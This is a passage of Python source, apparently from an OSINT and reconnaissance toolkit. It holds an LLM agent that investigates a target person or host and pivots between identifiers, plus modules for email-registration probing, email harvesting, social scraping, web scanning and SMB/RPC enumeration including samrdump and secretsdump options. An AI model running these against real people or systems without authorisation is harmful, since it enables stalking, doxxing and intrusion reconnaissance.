                if key == "username" and isinstance(val, str) and len(val) > 2:
                    pivots.append({"type": "username", "value": val, "source": tool_name})
                if key == "profiles" and isinstance(val, dict):
                    for platform, url in val.items():
                        pivots.append({"type": "profile_url", "value": url, "source": f"{tool_name}/{platform}"})
        return pivots

    def run(self) -> Dict:
        print(f"\n{Gr}[+] AI Agent starting deep investigation: {C}{self.target}{Wh} ({self.target_type}){RS}")
        print(f"{Y}[*] Model: {self.model} | Min tools: {self.min_tool_calls}{RS}\n")

        self.history.append({"role": "user", "content": f"Target: {self.target}\nType: {self.target_type}\nStart the investigation."})

        while self.iteration < self.max_iterations:
            self.iteration += 1
            phase_label = self.phase.upper()
            print(f"\n{Wh}[{R}{self.iteration}{Wh}] [{C}{phase_label}{Wh}] {Gr}Thinking...{RS}")

            sys_msgs = [
                {"role": "system", "content": AGENT_SYSTEM_PROMPT},
                *self.history[-15:],
            ]

            # Build context-rich user message
            context_parts = [f"Target: {self.target} ({self.target_type})"]
            context_parts.append(f"Phase: {self.phase} | Iteration: {self.iteration}")
            context_parts.append(f"Tools called so far: {self.tools_called} (minimum needed: {self.min_tool_calls})")
            if self.plan:
                plan_str = "\n".join(f"  {i+1}. {s}" for i, s in enumerate(self.plan))
                context_parts.append(f"Investigation plan:\n{plan_str}")
            if self.pending_pivots:
                pivot_str = "\n".join(f"  › {p['type']}: {p['value']} (from {p['source']})" for p in self.pending_pivots[:5])
                context_parts.append(f"Pending new leads to investigate:\n{pivot_str}")
            if self.findings:
                context_parts.append(f"Discovered data keys: {list(self.findings.keys())}")
            context_parts.append("Continue the investigation. If you have called 6+ tools and gathered sufficient data, "
                                 "first do a correlation pass (phase=correlate) then final report (phase=final).")

            user_msg = "\n".join(context_parts)
            response_text = self._call_llm(sys_msgs + [{"role": "user", "content": user_msg}])

            try:
                decision = json.loads(response_text)
            except json.JSONDecodeError:
                print(f"  {Y}[!] LLM response not JSON. Forcing continuation.{RS}")
                print(f"  Raw: {response_text[:200]}")
                continue

            reasoning = decision.get("reasoning", "")
            phase = decision.get("phase", "execute")

            # PHASE 1: Plan
            if phase == "plan":
                self.plan = decision.get("plan", [])
                plan_str = "\n".join(f"    {Gr}{i+1}.{Wh} {s}" for i, s in enumerate(self.plan))
                print(f"  {C}Investigation Plan ({len(self.plan)} steps):{RS}\n{plan_str}")
                self.phase = "execute"
                self.history.append({"role": "assistant", "content": response_text})
                self.history.append({"role": "user", "content": "Plan acknowledged. Start executing step 1."})
                continue

            # PHASE 2: Execute tool
            if phase == "execute":
                tool_name = decision.get("tool", "")
                params = decision.get("params", {})

                if reasoning:
                    print(f"  {Y}Reasoning{Wh}: {reasoning[:250]}{RS}")

                if not tool_name:
                    if self.tools_called >= self.min_tool_calls:
                        self.phase = "correlate"
                        self.history.append({"role": "assistant", "content": response_text})
                        self.history.append({"role": "user", "content": "Now perform correlation analysis on all findings."})
                        continue
                    else:
                        print(f"  {R}[!] No tool specified but only {self.tools_called}/{self.min_tool_calls} tools called. Forcing continue.{RS}")
                        continue

                step = decision.get("step", self.tools_called + 1)
                print(f"  {Gr}Step {step}{Wh} | {C}{tool_name}{Wh}({json.dumps(params)[:120]}){RS}")

                tool_result = self._execute_tool(tool_name, params)
                self.tools_called += 1
                result_str = json.dumps(tool_result, indent=1, default=str)[:4000]

                # Extract pivots
                new_pivots = self._extract_pivots(tool_name, tool_result)
                for p in new_pivots:
                    if p["value"] != self.target and p["value"] not in [x["value"] for x in self.pending_pivots]:
                        self.pending_pivots.append(p)

                print(f"  {C}Result{Wh}: {result_str[:250]}{RS}")
                if new_pivots:
                    for p in new_pivots[:3]:
                        print(f"    {Y}[+] New lead{Wh}: {p['type']} = {p['value']}{RS}")

                key = f"{tool_name}_{self.tools_called}"
                self.findings[key] = {"tool": tool_name, "params": params, "result": tool_result}

                self.history.append({"role": "assistant", "content": response_text})
                self.history.append({"role": "user", "content": f"Tool result:\n{result_str[:2000]}"})

                # Auto-investigate pending pivots if available
                if self.pending_pivots and self.tools_called < self.max_iterations - 3:
                    pivot = self.pending_pivots.pop(0)
                    if pivot["type"] == "ip" and self.tools_called < self.min_tool_calls + 3:
                        print(f"  {Y}[→] Auto-pivot: investigating {pivot['type']} {pivot['value']}{RS}")
                        self.history.append({"role": "user", "content": f"New lead discovered: {pivot['type']} = {pivot['value']}. Investigate it."})
                    elif pivot["type"] == "domain":
                        print(f"  {Y}[→] Auto-pivot: investigating domain {pivot['value']}{RS}")
                        self.history.append({"role": "user", "content": f"New domain found: {pivot['value']}. Run domain investigation."})
                    elif pivot["type"] == "email":
                        print(f"  {Y}[→] Auto-pivot: investigating email {pivot['value']}{RS}")
                        self.history.append({"role": "user", "content": f"New email found: {pivot['value']}. Check platforms and breaches."})
                    elif pivot["type"] == "username":
                        print(f"  {Y}[→] Auto-pivot: investigating username {pivot['value']}{RS}")
                        self.history.append({"role": "user", "content": f"New username found: {pivot['value']}. Track it."})

                continue

            # PHASE 3: Correlate
            if phase == "correlate":
                self.correlated = True
                connections = decision.get("connections_found", [])
                risk = decision.get("risk_score", 50)
                print(f"  {P}Correlation Analysis:{RS}")
                for c in connections[:5]:
                    print(f"    → {c}")
                if risk:
                    risk_color = R if risk > 60 else Y if risk > 30 else Gr
                    print(f"  {Gr}Risk Score{Wh}: {risk_color}{risk}/100{RS}")
                self.phase = "final"
                self.history.append({"role": "assistant", "content": response_text})
                self.history.append({"role": "user", "content": "Now provide the final investigation report."})
                continue

            # PHASE 4: Final
            if phase == "final":
                print(f"\n{Gr}▶ Investigation complete!{RS}")
                decision.setdefault("tools_used", list(set(v["tool"] for v in self.findings.values())))
                decision.setdefault("total_tools_called", self.tools_called)
                decision.setdefault("new_leads", [f"{p['type']}: {p['value']}" for p in self.pending_pivots])
                return decision

            # Fallback: unknown phase
            print(f"  {Y}[!] Unknown phase '{phase}', continuing{RS}")
            self.history.append({"role": "assistant", "content": response_text})

        print(f"\n{Y}[!] Max iterations ({self.max_iterations}) reached{RS}")
        summary_parts = [f"{k}: {json.dumps(v.get('result',{}), default=str)[:100]}" for k, v in self.findings.items()]
        return {"phase": "final", "target": self.target, "summary": f"Investigation exhausted after {self.iteration} iterations",
                "tools_used": list(set(v["tool"] for v in self.findings.values())), "total_tools_called": self.tools_called,
                "key_findings": summary_parts[:10], "risk_score": 50, "connections_discovered": [],
                "new_leads": [], "recommendations": ["Increase max_iterations or try targeted approach"]}


def ai_agent_engine():
    clear()
    print(f"\n{R}╔══ AI Autonomous Investigator v2 ══╗{Wh}")
    print(f"{R}║{Wh}  Multi-Step Deep OSINT Investigation     {R}║{Wh}")
    print(f"{R}║{Wh}  Plan → Execute (6+ tools) → Correlate  {R}║{Wh}")
    print(f"{R}╚═══════════════════════════════════════════╝{RS}\n")

    if Groq is None:
        print(f"{R}[!] Groq not installed. Run: pip install groq{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    api_key = os.environ.get("GROQ_API_KEY")
    if not api_key:
        print(f"{Y}[!] GROQ_API_KEY not set{Wh}")
        key = input(f"{Wh}[+] Enter your Groq API key: {Gr}").strip()
        if not key:
            return
        os.environ["GROQ_API_KEY"] = key
        api_key = key

    target = input(f"\n{Wh}[+] Target {Gr}[email, username, domain, IP, phone]{Wh}: {Gr}").strip()
    if not target:
        return
    target = target.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]

    agent = AIAgent(api_key, target)
    result = agent.run()

    print(f"\n {'='*60}")
    print(f" {R}╔══ FINAL INVESTIGATION REPORT ══╗")
    print(f" {'='*60}{RS}")
    print(f"{Wh} Target          : {C}{target}")
    print(f"{Wh} Type            : {C}{agent.target_type}")
    print(f"{Wh} Tools Called    : {Gr}{agent.tools_called} / {agent.min_tool_calls}+ required")
    print(f"{Wh} Iterations      : {Gr}{agent.iteration}{Wh}")

    summary = result.get("summary", "")
    if summary:
        print(f"\n{Gr} Summary{Wh}: {summary[:500]}{Wh}")

    tools_used = result.get("tools_used", [])
    if tools_used:
        print(f"\n{Gr} Tools Used ({len(tools_used)}):{Wh}")
        for t in tools_used:
            print(f"  • {t}")

    findings = result.get("key_findings", [])
    if findings:
        print(f"\n{Gr} Key Findings:{Wh}")
        for f in findings:
            print(f"  • {str(f)[:200]}")

    risk = result.get("risk_score")
    if risk is not None:
        risk_color = R if risk > 60 else Y if risk > 30 else Gr
        print(f"\n{Gr} Risk Score     : {risk_color}{risk}/100{Wh}")

    connections = result.get("connections_discovered", [])
    if connections:
        print(f"\n{Gr} Connections:{Wh}")
        for c in connections:
            print(f"  → {c}")

    leads = result.get("new_leads", [])
    if leads:
        print(f"\n{C} New Leads for Further Investigation:{Wh}")
        for l in leads:
            print(f"  ◆ {l}")

    recs = result.get("recommendations", [])
    if recs:
        print(f"\n{Gr} Recommendations:{Wh}")
        for r in recs:
            print(f"  • {r}")

    print(f"\n{'='*60}")
    print(f"{Gr} RAW FINDINGS:{Wh}")
    for key, data in agent.findings.items():
        tool_name = data.get("tool", key)
        res_preview = json.dumps(data.get("result", {}), default=str)[:150]
        print(f"  {C}{key}{Wh}: [{tool_name}] {res_preview}")

    report_data = {
        "target": target, "type": agent.target_type, "iterations": agent.iteration,
        "tools_called": agent.tools_called, "final_analysis": result,
        "raw_findings": {k: {"tool": v["tool"], "result": v["result"]} for k, v in agent.findings.items()}
    }
    result_obj = ScanResult(
        timestamp=datetime.now().isoformat(), scan_type="ai_agent_v2",
        target=target, data=report_data
    )
    save_report(result_obj)
    input(f"\n{Wh}[+] Press Enter")


def ai_agent_engine():
    clear()
    print(f"\n{R}╔══ AI Autonomous Investigator ══╗{Wh}")
    print(f"{R}║{Wh}  Unified AI Agent — Uses ALL Tool Features   {R}║{Wh}")
    print(f"{R}║{Wh}  Autonomous multi-tool OSINT orchestration    {R}║{Wh}")
    print(f"{R}╚══════════════════════════════════════════════╝{RS}\n")

    if Groq is None:
        print(f"{R}[!] Groq not installed. Run: pip install groq{Wh}")
        input(f"\n{Wh}[+] Press Enter")
        return

    api_key = os.environ.get("GROQ_API_KEY")
    if not api_key:
        print(f"{Y}[!] GROQ_API_KEY not set{Wh}")
        key = input(f"{Wh}[+] Enter your Groq API key: {Gr}").strip()
        if not key:
            return
        os.environ["GROQ_API_KEY"] = key
        api_key = key

    target = input(f"\n{Wh}[+] Target {Gr}[email, username, domain, IP, phone]{Wh}: {Gr}").strip()
    if not target:
        return

    target = target.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]

    agent = AIAgent(api_key, target)
    result = agent.run()

    print(f"\n {'='*55}")
    print(f" {R} FINAL INVESTIGATION REPORT")
    print(f" {'='*55}")
    print(f"{Wh} Target       : {C}{target}")
    print(f"{Wh} Type         : {C}{agent.target_type}")
    print(f"{Wh} Iterations   : {Gr}{agent.iteration}")
    print(f"{Wh} Tools Called : {Gr}{len(agent.findings)}{Wh}")

    summary = result.get("summary", "")
    if summary:
        print(f"\n{Gr} Summary{Wh}: {summary}")

    key_findings = result.get("key_findings", [])
    if key_findings:
        print(f"\n{Gr} Key Findings:{Wh}")
        for f in key_findings:
            print(f"  • {f}")

    risk = result.get("risk_score")
    if risk is not None:
        risk_color = R if risk > 60 else Y if risk > 30 else Gr
        print(f"\n{Gr} Risk Score   : {risk_color}{risk}/100{Wh}")

    connections = result.get("connections", [])
    if connections:
        print(f"\n{Gr} Connections Found:{Wh}")
        for c in connections:
            print(f"  → {c}")

    recommendations = result.get("recommendations", [])
    if recommendations:
        print(f"\n{Gr} Recommendations:{Wh}")
        for r in recommendations:
            print(f"  • {r}")

    print(f"\n{'='*55}")
    print(f"{Gr} All Findings (raw){Wh}:")
    for key, data in agent.findings.items():
        print(f"  {C}{key}{Wh}: {json.dumps(data, default=str)[:300]}")

    report_data = {
        "target": target,
        "type": agent.target_type,
        "iterations": agent.iteration,
        "tools_called": len(agent.findings),
        "final_analysis": result,
        "raw_findings": {k: v for k, v in agent.findings.items()}
    }
    result_obj = ScanResult(
        timestamp=datetime.now().isoformat(),
        scan_type="ai_agent",
        target=target,
        data=report_data
    )
    save_report(result_obj)

    input(f"\n{Wh}[+] Press Enter")


# ── Advanced Security & OSINT Modules ───────────────────────────────

def check_email_platforms(email: str) -> Dict:
    """حساب Holehe: التحقق من وجود البريد على المنصات"""
    result = {"email": email, "registered_on": [], "not_registered": [], "errors": []}
    domain = email.split("@")[1] if "@" in email else ""
    session = get_session()

    checks = [
        {"name": "Twitter", "url": "https://x.com/users/forgot_password", "data": {"email": email},
         "type": "post", "indicator": "email_not_found"},
        {"name": "Instagram", "url": "https://www.instagram.com/accounts/web_create_ajax/",
         "type": "post", "data": {"email": email}, "indicator": "email_is_taken"},
        {"name": "Adobe", "url": "https://auth.services.adobe.com/signup/v2/users/email", "type": "post",
         "data": {"email": email, "serviceName": "adobeid"}, "indicator": "already_have_account"},
        {"name": "Pinterest", "url": "https://www.pinterest.com/resource/EmailExistsResource/get/",
         "type": "get", "params": {"email": email}, "indicator": "true"},
        {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/merlin/login",
         "type": "post", "data": {"email": email}, "indicator": "error"},
        {"name": "Spotify", "url": "https://www.spotify.com/api/signup/validate",
         "type": "post", "data": {"validate": "email", "email": email}, "indicator": "already_used"},
        {"name": "WordPress.com", "url": "https://public-api.wordpress.com/rest/v1.1/users/email/exists",
         "type": "post", "data": {"email": email}, "indicator": "true"},
        {"name": "Tumblr", "url": "https://www.tumblr.com/svc/account/register_email_check",
         "type": "post", "data": {"email": email}, "indicator": "taken"},
        {"name": "Patreon", "url": "https://www.patreon.com/api/auth/check_email", "type": "post",
         "data": {"data": {"attributes": {"email": email}}}, "indicator": "taken"},
        {"name": "Dribbble", "url": "https://dribbble.com/api/v3/users/check?email=" + requests.utils.quote(email),
         "type": "get", "indicator": "taken"},
        {"name": "GitLab", "url": "https://gitlab.com/users/sign_in", "type": "get_check",
         "check_url": f"https://gitlab.com/api/v4/users?search={email.split('@')[0]}", "indicator": "email"},
    ]

    for check in checks:
        try:
            if check["type"] == "post":
                resp = session.post(check["url"], json=check.get("data", {}), timeout=6,
                                    headers={"User-Agent": random.choice(CONFIG["user_agents"])},
                                    allow_redirects=False)
                body = resp.text.lower()
                indicator = check.get("indicator", "")
                if indicator and indicator in body:
                    result["registered_on"].append(check["name"])
                elif resp.status_code == 200:
                    try:
                        j = resp.json()
                        if isinstance(j, dict) and any(indicator in str(v).lower() for v in j.values()):
                            result["registered_on"].append(check["name"])
                    except:
                        pass
            elif check["type"] == "get":
                resp = session.get(check["url"], params=check.get("params", {}), timeout=6,
                                   headers={"User-Agent": random.choice(CONFIG["user_agents"])})
                body = resp.text.lower()
                if check.get("indicator", "") in body:
                    result["registered_on"].append(check["name"])
            elif check["type"] == "get_check":
                resp = session.get(check["check_url"], timeout=6,
                                   headers={"User-Agent": random.choice(CONFIG["user_agents"])})
                if check.get("indicator", "") in resp.text.lower():
                    result["registered_on"].append(check["name"])
        except Exception as e:
            result["errors"].append(f"{check['name']}: {str(e)[:30]}")

    result["registered_count"] = len(result["registered_on"])
    return result


def harvester_search(query: str, sources: str = "all") -> Dict:
    """theHarvester: جمع الإيميلات والنطاقات من محركات البحث"""
    result = {"query": query, "emails": [], "hosts": [], "subdomains": [], "ips": []}
    session = get_session()

    if sources in ("all", "google"):
        try:
            resp = session.get(
                f"https://www.google.com/search?q=%40{query.split('@')[0] if '@' in query else query}+email",
                timeout=8, headers={"User-Agent": random.choice(CONFIG["user_agents"])}
            )
            emails = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', resp.text))
            result["emails"] = list(emails)[:30]
        except:
            pass

    if sources in ("all", "bing"):
        try:
            resp = session.get(
                f"https://www.bing.com/search?q=site%3A{query}+email",
                timeout=8, headers={"User-Agent": random.choice(CONFIG["user_agents"])}
            )
            found = set(re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', resp.text))
            result["emails"] = list(set(result["emails"] + list(found)))[:30]
        except:
            pass

    if sources in ("all", "crt"):
        try:
            import dns.resolver
            subs = get_subdomains_crt(query)
            result["subdomains"] = subs[:30]
            for sub in subs[:10]:
                try:
                    ips = dns.resolver.resolve(sub, 'A')
                    for ip in ips:
                        result["ips"].append(str(ip))
                except:
                    pass
        except:
            pass

    if sources in ("all", "dns"):
        try:
            engine = DnsReconEngine(query)
            subs = engine.brute_subdomains(threads=10)
            for sub, ips in subs:
                result["hosts"].append(f"{sub}.{query}")
                result["ips"].extend(ips)
        except:
            pass

    result["total"] = len(result["emails"]) + len(result["subdomains"]) + len(result["ips"])
    return result


def social_scraper(platform: str, query: str, limit: int = 50) -> Dict:
    """snscrape: سحب منشورات من تويتر/ريديت بدون API"""
    result = {"platform": platform, "query": query, "posts": [], "error": None}

    try:
        import snscrape.modules.twitter as sntwitter
        tweets = []
        for i, tweet in enumerate(sntwitter.TwitterSearchScraper(query).get_items()):
            if i >= limit:
                break
            tweets.append({
                "date": str(tweet.date),
                "user": tweet.user.username,
                "content": tweet.content[:500],
                "url": tweet.url,
                "retweets": tweet.retweetCount,
                "likes": tweet.likeCount,
                "replies": tweet.replyCount
            })
        if tweets:
            result["posts"] = tweets
            result["count"] = len(tweets)
            return result
    except ImportError:
        result["error"] = "snscrape not installed (pip install snscrape)"
    except Exception as e:
        result["error"] = str(e)[:100]

    try:
        import snscrape.modules.reddit as snreddit
        posts = []
        for i, post in enumerate(snreddit.RedditSearchScraper(query).get_items()):
            if i >= limit:
                break
            posts.append({
                "date": str(post.date),
                "title": post.title[:200] if hasattr(post, 'title') else "",
                "content": post.selftext[:500] if hasattr(post, 'selftext') else (post.body[:500] if hasattr(post, 'body') else ""),
                "url": post.url,
                "score": post.score if hasattr(post, 'score') else 0
            })
        if posts:
            result["posts"] = posts
            result["count"] = len(posts)
            return result
    except ImportError:
        pass
    except Exception as e:
        result["error"] = str(e)[:100]

    return result


def nikto_scan(target: str) -> Dict:
    """nikto: فحص خادم الويب للبحث عن ملفات خطيرة"""
    result = {"target": target, "vulnerabilities": [], "raw": ""}
    result["note"] = "Install nikto: apt install nikto (Linux/WSL)"
    try:
        import subprocess
        cmd = ["nikto", "-h", target, "-ssl", "-Format", "json", "-nointeractive"]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        if proc.returncode == 0 or proc.stdout:
            result["raw"] = proc.stdout[:2000]
            try:
                nikto_json = json.loads(proc.stdout)
                if isinstance(nikto_json, list):
                    result["vulnerabilities"] = nikto_json
                elif isinstance(nikto_json, dict):
                    result["vulnerabilities"] = nikto_json.get("vulnerabilities", [])
            except:
                lines = [l for l in proc.stdout.split('\n') if '+' in l or '!' in l]
                result["vulnerabilities"] = lines[:30]
        elif proc.stderr:
            result["error"] = proc.stderr[:200]
    except FileNotFoundError:
        result["error"] = "nikto not found"
    except subprocess.TimeoutExpired:
        result["error"] = "Scan timed out"
    except Exception as e:
        result["error"] = str(e)[:100]
    return result


def whatweb_detect(target: str) -> Dict:
    """whatweb: كشف تقنيات الموقع بدقة"""
    result = {"target": target, "plugins": [], "raw": ""}
    result["note"] = "Install whatweb: apt install whatweb (Linux/WSL)"
    try:
        import subprocess
        cmd = ["whatweb", "-a", "3", "--no-errors", "-q", target]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.stdout:
            result["raw"] = proc.stdout.strip()[:2000]
            parts = proc.stdout.strip().split(',')
            for p in parts[1:]:
                p = p.strip()
                if '[' in p:
                    name = p.split('[')[0].strip()
                    details = p.split('[')[1].rstrip(']')
                    if name:
                        result["plugins"].append({"name": name, "details": details})
                elif p:
                    result["plugins"].append({"name": p, "details": ""})
        if proc.stderr and not result["plugins"]:
            result["error"] = proc.stderr[:200]
    except FileNotFoundError:
        result["error"] = "whatweb not found"
    except subprocess.TimeoutExpired:
        result["error"] = "Scan timed out"
    except Exception as e:
        result["error"] = str(e)[:100]
    return result


def gospider_crawl(target: str, depth: int = 2, concurrency: int = 3) -> Dict:
    """gospider: زحف عميق للمواقع مع اكتشاف JS"""
    result = {"target": target, "urls": [], "forms": [], "js_files": [], "subdomains": []}
    result["note"] = "Install gospider: go install github.com/jaeles-project/gospider@latest"
    try:
        import subprocess
        cmd = ["gospider", "-s", target, "-d", str(depth), "-c", str(concurrency),
               "-t", "2", "--js", "--sitemap", "--robots", "-o", "."]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = proc.stdout + proc.stderr
        result["raw"] = output[:2000]
        urls = set(re.findall(r'https?://[^\s"\'<>]+', output))
        result["urls"] = sorted(urls)[:50]
        result["forms"] = re.findall(r'\[form\]\s*(.*)', output)[:20]
        result["js_files"] = re.findall(r'\[javascript\]\s*(.*)', output)[:20]
        result["subdomains"] = re.findall(r'\[subdomain\]\s*(.*)', output)[:20]
    except FileNotFoundError:
        result["error"] = "gospider not found"
    except subprocess.TimeoutExpired:
        result["error"] = "Crawl timed out"
    except Exception as e:
        result["error"] = str(e)[:100]
    return result


def impacket_enum(target: str, protocol: str = "smb") -> Dict:
    """impacket: تعداد بروتوكولات ويندوز"""
    result = {"target": target, "protocol": protocol, "findings": []}
    result["note"] = "Install impacket: pip install impacket"
    try:
        import subprocess
        if protocol == "smb":
            cmd = ["smbclient", "-L", target, "-N"]
        elif protocol == "rpc":
            cmd = ["rpcclient", "-U", "", "-N", target]
        elif protocol == "enum4linux":
            cmd = ["enum4linux", "-a", target]
        elif protocol == "samrdump":
            cmd = ["samrdump.py", target]
        else:
            cmd = ["impacket-" + protocol, target]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if proc.stdout:
            result["findings"] = proc.stdout.split('\n')[:50]
            result["raw"] = proc.stdout[:2000]
        if proc.stderr:
            result["stderr"] = proc.stderr[:500]
    except FileNotFoundError:
        pass
    except Exception as e:
        result["error"] = str(e)[:100]
    return result


def advanced_tools_menu():
    clear()
    print(f"\n{R}╔══ Advanced Security & OSINT Modules ══╗{Wh}")
    print(f"{R}║{Wh}  holehe · theHarvester · snscrape · nikto  {R}║{Wh}")
    print(f"{R}║{Wh}  whatweb · gospider · impacket            {R}║{Wh}")
    print(f"{R}╚═══════════════════════════════════════════════╝{RS}")

    while True:
        print(f"\n{R}┌── Advanced Modules ──┐{Wh}")
        print(f"  {Gr}[1]{Wh}  Holehe — Email Platform Checker{R}  🆕{Wh}")
        print(f"  {Gr}[2]{Wh}  theHarvester — Search Engine OSINT")
        print(f"  {Gr}[3]{Wh}  snscrape — Social Media Scraper")
        print(f"  {Gr}[4]{Wh}  nikto — Web Vulnerability Scanner")
        print(f"  {Gr}[5]{Wh}  whatweb — Enhanced Tech Detection")
        print(f"  {Gr}[6]{Wh}  gospider — Deep JS Crawler")
        print(f"  {Gr}[7]{Wh}  impacket — Windows Protocol Enum")
        print(f"  {Gr}[0]{Wh}  Back")
        print(f"{R}└{'─'*25}┘{RS}")

        choice = input(f"\n{Wh}[{R}?{Wh}] {R}Select{Wh}: {Gr}").strip()

        if choice == '0':
            break

        elif choice == '1':
            clear()
            print(f"\n{C}══ Holehe — Email Platform Checker ══{RS}\n")
            email = input(f"{Wh}[+] Email: {Gr}").strip()
            if not email or '@' not in email:
                print(f"{R}[!] Valid email required{RS}")
                input(f"\n[+] Press Enter")
                continue
            print(f"{Y}[*] Checking {email} across platforms...{RS}")
            result = check_email_platforms(email)
            print(f"\n{Gr} Registered on:{Wh}")
            for p in result.get("registered_on", []):
                print(f"  ✓ {C}{p}{Wh}")
            print(f"\n{Y} Total: {len(result.get('registered_on', []))} platforms{RS}")
            if result.get("errors"):
                print(f"\n{R} Errors:{Wh}")
                for e in result["errors"]:
                    print(f"  ✗ {e}")
            input(f"\n[+] Press Enter")

        elif choice == '2':
            clear()
            print(f"\n{C}══ theHarvester — Search Engine OSINT ══{RS}\n")
            query = input(f"{Wh}[+] Domain/Query: {Gr}").strip()
            if not query:
                continue
            src = input(f"{Wh}[+] Sources {Gr}[all/google/bing/crt/dns]{Wh}: {Gr}").strip() or "all"
            print(f"{Y}[*] Harvesting from {src}...{RS}")
            result = harvester_search(query, src)
            print(f"\n{Gr} Emails ({len(result.get('emails', []))}):{Wh}")
            for e in result.get("emails", [])[:10]:
                print(f"  {C}{e}{Wh}")
            print(f"\n{Gr} Subdomains ({len(result.get('subdomains', []))}):{Wh}")
            for s in result.get("subdomains", [])[:10]:
                print(f"  {C}{s}{Wh}")
            print(f"\n{Gr} IPs ({len(result.get('ips', []))}):{Wh}")
            for ip in result.get("ips", [])[:10]:
                print(f"  {C}{ip}{Wh}")
            input(f"\n[+] Press Enter")

        elif choice == '3':
            clear()
            print(f"\n{C}══ snscrape — Social Media Scraper ══{RS}\n")
            print(f"{Wh} Platforms: twitter, reddit{Wh}")
            platform = input(f"{Wh}[+] Platform: {Gr}").strip().lower()
            query = input(f"{Wh}[+] Search query: {Gr}").strip()
            lim = input(f"{Wh}[+] Limit {Gr}[50]{Wh}: {Gr}").strip()
            limit = int(lim) if lim.isdigit() else 50
            if not platform or not query:
                continue
            print(f"{Y}[*] Scraping {platform} for '{query}'...{RS}")
            result = social_scraper(platform, query, limit)
            if result.get("error"):
                print(f"{R}[!] {result['error']}{RS}")
            elif result.get("posts"):
                print(f"\n{Gr} Found {result['count']} posts:{Wh}")
                for post in result["posts"][:10]:
                    print(f"  {C}{post.get('date','')[:10]}{Wh} | {post.get('user','')[:20]:20} | {post.get('content','')[:100]}")
            else:
                print(f"{Y}[-] No results{RS}")
            input(f"\n[+] Press Enter")

        elif choice == '4':
            clear()
            print(f"\n{C}══ nikto — Web Vulnerability Scanner ══{RS}\n")
            target = input(f"{Wh}[+] Target URL/IP: {Gr}").strip()
            if not target:
                continue
            print(f"{Y}[*] Running nikto scan on {target}...{RS}")
            result = nikto_scan(target)
            if result.get("error"):
                print(f"{R}  {result['error']}{RS}")
            if result.get("note"):
                print(f"{Y}  {result['note']}{RS}")
            if result.get("vulnerabilities"):
                print(f"\n{Gr} Findings:{Wh}")
                for vuln in result["vulnerabilities"][:20]:
                    print(f"  ! {C}{vuln if isinstance(vuln, str) else json.dumps(vuln)[:200]}{Wh}")
            if result.get("raw"):
                print(f"\n{Y} Raw output:{Wh}\n{result['raw'][:1000]}")
            input(f"\n[+] Press Enter")

        elif choice == '5':
            clear()
            print(f"\n{C}══ whatweb — Enhanced Tech Detection ══{RS}\n")
            target = input(f"{Wh}[+] Target URL: {Gr}").strip()
            if not target:
                continue
            print(f"{Y}[*] Running whatweb...{RS}")
            result = whatweb_detect(target)
            if result.get("error"):
                print(f"{R}  {result['error']}{RS}")
            if result.get("note"):
                print(f"{Y}  {result['note']}{RS}")
            if result.get("plugins"):
                print(f"\n{Gr} Detected ({len(result['plugins'])}):{Wh}")
                for p in result["plugins"]:
                    name = p.get("name", "")
                    details = p.get("details", "")
                    print(f"  {C}{name:25}{Wh} {details[:80]}")
            if result.get("raw"):
                print(f"\n{Y} Raw:{Wh} {result['raw'][:500]}")
            input(f"\n[+] Press Enter")

        elif choice == '6':
            clear()
            print(f"\n{C}══ gospider — Deep JS Crawler ══{RS}\n")
            target = input(f"{Wh}[+] Target URL: {Gr}").strip()
            if not target:
                continue
            depth = input(f"{Wh}[+] Depth {Gr}[2]{Wh}: {Gr}").strip()
            depth = int(depth) if depth.isdigit() else 2
            print(f"{Y}[*] Crawling {target}...{RS}")
            result = gospider_crawl(target, depth)
            if result.get("error"):
                print(f"{R}  {result['error']}{RS}")
            if result.get("note"):
                print(f"{Y}  {result['note']}{RS}")
            if result.get("urls"):
                print(f"\n{Gr} URLs ({len(result['urls'])}):{Wh}")
                for u in result["urls"][:15]:
                    print(f"  {C}{u[:120]}{Wh}")
            if result.get("forms"):
                print(f"\n{Gr} Forms ({len(result['forms'])}):{Wh}")
                for f in result["forms"][:10]:
                    print(f"  {C}{f[:120]}{Wh}")
            if result.get("js_files"):
                print(f"\n{Gr} JS Files ({len(result['js_files'])}):{Wh}")
                for j in result["js_files"][:10]:
                    print(f"  {C}{j[:120]}{Wh}")
            if result.get("subdomains"):
                print(f"\n{Gr} Subdomains ({len(result['subdomains'])}):{Wh}")
                for s in result["subdomains"][:10]:
                    print(f"  {C}{s}{Wh}")
            input(f"\n[+] Press Enter")

        elif choice == '7':
            clear()
            print(f"\n{C}══ impacket — Windows Protocol Enum ══{RS}\n")
            print(f"{Wh} Protocols: smb, rpc, enum4linux, samrdump, secretsdump{Wh}")
            target = input(f"{Wh}[+] Target IP: {Gr}").strip()
            if not target:
                continue
            protocol = input(f"{Wh}[+] Protocol {Gr}[smb]{Wh}: {Gr}").strip() or "smb"
            print(f"{Y}[*] Enumerating {protocol} on {target}...{RS}")
            result = impacket_enum(target, protocol)
            if result.get("error"):
                print(f"{R}  {result['error']}{RS}")
            if result.get("note"):
                print(f"{Y}  {result['note']}{RS}")
            if result.get("findings"):
                print(f"\n{Gr} Findings:{Wh}")
                for line in result["findings"][:20]:
                    print(f"  {line[:150]}")
            if result.get("stderr"):
                print(f"\n{Y} stderr:{Wh} {result['stderr'][:300]}")
            input(f"\n[+] Press Enter")

        else:
            print(f"{R}[!] Invalid option{RS}")
            time.sleep(1)


def create_investigation_graph(data: Dict, output_file: str = "investigation_graph.html") -> str:
    try:
        import networkx as nx
    except ImportError:
        return "Install networkx: pip install networkx"

    G = nx.DiGraph()
    colors = {
        "email": "#ff6b6b", "username": "#4ecdc4", "domain": "#45b7d1",
        "ip": "#96ceb4", "phone": "#ffeaa7", "breach": "#d63031",
        "platform": "#0984e3", "avatar": "#a29bfe", "email_found": "#fd79a8",
        "phone_found": "#e17055", "default": "#636e72",
    }

    def add_to_graph(node_dict: Dict, parent: str = ""):
        node_id = f"{node_dict['type']}:{node_dict['value']}"
        color = colors.get(node_dict['type'], colors['default'])
